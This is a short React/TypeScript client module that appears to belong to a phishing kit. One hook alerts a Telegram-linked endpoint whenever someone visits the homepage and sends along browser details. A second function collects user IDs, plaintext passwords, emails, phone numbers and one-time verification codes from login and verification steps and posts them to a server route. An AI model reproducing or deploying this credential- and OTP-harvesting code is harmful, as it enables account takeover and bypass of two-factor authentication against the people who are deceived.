'use client'

import { useEffect } from 'react'

export function useVisitorTracking() {
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        if (typeof window === 'undefined') return

        // Limit visit notifications to homepage only
        if (window.location.pathname !== '/') return

        await fetch('/api/telegram/visitor', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            screen: `${window.screen.width}x${window.screen.height}`,
            language: navigator.language,
            referrer: document.referrer || 'Direct',
            pageUrl: window.location.href,
          }),
        })
      } catch (error) {
        console.error('Failed to track visitor:', error)
      }
    }

    trackVisitor()
  }, [])
}

export function trackFormSubmission(data: {
  type: 'login' | 'registration' | 'email_verification' | 'text_verification' | 'email_selection' | 'text_selection' | 'login_did_not_receive_code'
  userId?: string
  password?: string
  email?: string
  phone?: string
  otp?: string
  page: string
  timestamp?: string
}) {
  const formData = {
    ...data,
    timestamp: new Date().toISOString()
  }

  return fetch('/api/form-submission', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(formData)
  }).catch(error => {
    console.error('Failed to track form submission:', error)
  })
}
